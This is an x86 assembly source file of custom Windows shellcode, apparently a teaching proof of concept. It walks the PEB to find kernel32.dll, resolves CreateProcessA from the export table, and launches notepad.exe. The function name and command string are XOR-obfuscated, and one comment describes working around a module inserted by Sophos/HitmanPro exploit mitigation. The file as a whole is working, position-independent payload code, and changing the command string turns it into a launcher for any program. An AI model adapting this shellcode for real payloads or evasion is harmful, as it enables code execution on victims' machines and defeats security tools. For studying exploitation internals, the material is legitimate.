global start

; custom shellcode to locate and call a arbitrary WinAPI-function in Kernel32.dll 
; non-optimized but therefore comprehensible ^^

section .text

start:
    push ebp
    mov ebp,esp
    xor edx,edx

    ; find Base address Kernel32.dll    
    mov edx,[fs:edx+0x30]   ; address from PEB (Process Environment Block)
    mov edx,[edx+0x0C]      ; PED_LDR_STRUCT
    ;typedef struct _PEB_LDR_DATA {
        ;  ULONG                   Length;
        ;  BOOLEAN                 Initialized;
        ;  PVOID                   SsHandle;
        ;  LIST_ENTRY              InLoadOrderModuleList;
        ;  LIST_ENTRY              InMemoryOrderModuleList;
        ;  LIST_ENTRY              InInitializationOrderModuleList;
    ;} PEB_LDR_DATA, *PPEB_LDR_DATA;

    mov edx,[edx+0x14]      ; InMemoryOrderModuleList
    ; Step through module list (first: ntdll.dll, module order is not predictable! --> for example: Sophos exploit mitigation insert hmpalert.dll as second module in user process (HitmanPro)
    ; InMemoryOrderModuleList-Struct: offset 0x28 point to dll file name as UNICODE (ToDo: compare dll name)
    mov edx,[edx]           ; InMemoryOrderModule List ntdll.dll
    mov edx,[edx]           ; hmpalert.dll --> delete the line on windows without HitmanPro
    mov edx,[edx]           ; kernel32.dll
    mov ecx,[edx+0x10]      ; Kernel32.dll  base address
    push ecx                ; Base address [EBX+12]
    mov ebx,[esp]           ; Save base address in register EBX 

    ; Parse PE File (helpful: PEView)
    mov edx,[ecx+0x3C]      ; Base address + RVA from New EXE Header
    add ecx,edx             ; Base address + RVA = PE SIGNATURE
    push ecx                
    mov edx,[ecx+0x78]      ; RVA IMAGE_EXPORT_DIRECTORY (== called EXPORT TABLE)
    mov ecx,ebx             ; Base Address
    add ecx,edx
    push ecx                ; Save IMAGE_EXPORT_DIRECTORY

    mov edx,[ecx+0x14]      ; Number of functions
    push edx

    mov eax,ebx             ; Load Base address
    mov edx,[ecx+0x1C]      ; RVA Export Address Table
    add eax,edx
    push eax                ; Absolute address: EXPORT Address Table
    
    mov eax,ebx             ; Load Base address
    mov edx,[ecx+0x20]      ; RVA Export Name Pointer Table
    add eax,edx
    push eax                ; Absolute address: EXPORT Name Pointer Table

    mov eax,ebx             ; Load Base address
    mov edx,[ecx+0x24]      ; RVA Export Ordinal Table 
    add eax,edx
    push eax                ; Absolute address: EXPORT Ordinal Table

    ;Push function name to stack
    ; generated by ObfuscateString.py (CreateProcessA)
    xor edx,edx
    push edx

    mov edx,0xf4b08e83
    xor edx,0xf4b0cff0
    push edx

    mov edx,0x076717ec
    xor edx,0x74027483
    push edx

    mov edx,0x981eda2a
    xor edx,0xea4ebf5e
    push edx

    mov edx,0x2149697c
    xor edx,0x402c1b3f
    push edx

    xor eax,eax
    mov edx,[ebp-0x18]       ; Start address from Name Pointer Table ==> RVA from first WinAPI name 

loop:
    add edx,4               ; Next entry in Name Pointer Table ==> RVA from second WinAPI name 
    inc eax                 ; Loop counter

    lea esi,[esp]           ; load pointer to "CreateProcessA" string into ESI (our arbitrary function name)

    mov ebx,[ebp-0x04]      ; calculate and load string address B to EDI
    add ebx,[edx]           ; Absoulte address from WinAPI name 
    mov edi,ebx             ; load pointer to function name into EDI

    ; Comparing ESI and EDI
    cld                     ; Compare in forward direction
    xor ecx,ecx             ; clear register
    add ecx,0xF               ; Compare 8 Byte
    repe cmpsb              ; Compare esi and edi (Comparing string: https://www.aldeid.com/wiki/X86-assembly/Instructions/cmpsb)
    jne loop

    ; Load RVA from WinAPI function
    ; EAX contains the position from CreateProcessA
    xor ebx,ebx
    mov ecx,[ebp-0x1C]           ; Absolute address from Ordinal table ==> 2 Byte per position --> not 4 byte
    mov bx,[ecx+eax*2]      ; ECX holds the position in Address Table

    mov edx,[ebp-0x14]         ; Absolute address from Address Table
    mov edx,[edx+4*ebx]     ; RVA from CreateProcessA

    mov ebx,[ebp-0x04]      ; Base address
    add ebx,edx             ; EBX holds the WinAPI function entry point!

    ; Push command to stack (C:\Windows\system32\notepad.exe)
    
    xor edx,edx
    push edx

    mov edx,0x5d123519
    xor edx,0x5d774d7c
    push edx

    mov edx,0xdfd409a6
    xor edx,0xf1b068d6
    push edx

    mov edx,0xe909cd57
    xor edx,0x8c7da239
    push edx

    mov edx,0xdc2fe60a
    xor edx,0x801dd567
    push edx

    mov edx,0x19c1c2ef
    xor edx,0x7cb5b196
    push edx

    mov edx,0x72119672
    xor edx,0x014de505
    push edx

    mov edx,0xe99563e1
    xor edx,0x86f10d88
    push edx

    mov edx,0x851c4285
    xor edx,0xd24078e6
    push edx

    lea edx,[esp]

    ;CreateProcess( NULL,   // No module name (use command line)
    ;    argv[1],        // Command line
    ;    NULL,           // Process handle not inheritable
    ;    NULL,           // Thread handle not inheritable
    ;    FALSE,          // Set handle inheritance to FALSE
    ;    0,              // No creation flags
    ;    NULL,           // Use parent's environment block
    ;    NULL,           // Use parent's starting directory 
    ;    &si,            // Pointer to STARTUPINFO structure (Sizeof: 68 Byte = 0x44)
    ;    &pi )           // Pointer to PROCESS_INFORMATION structure (Sizeof: 16 Byte 0x10)

    sub esp,0x54            ;0x44 + 0x10 = 0x54 => memory allocation for struct STARTUPINFO & struct PROCESS_INFORMATION
    lea ecx,[esp+0x10]  
    push esp                ; Pointer to PROCESS_INFORMATION structure --> last argument
    push ecx                ; Pointer to STARTUPINFO structure
    xor ecx,ecx
    push ecx          
    push ecx
    push ecx
    push ecx
    push ecx
    push ecx
    push edx                ; second argument --> pointer to command
    push ecx                ; first argument
    
    ;call function
    call ebx
    ; cleaning stack
    mov esp,ebp
    pop ebp
    retn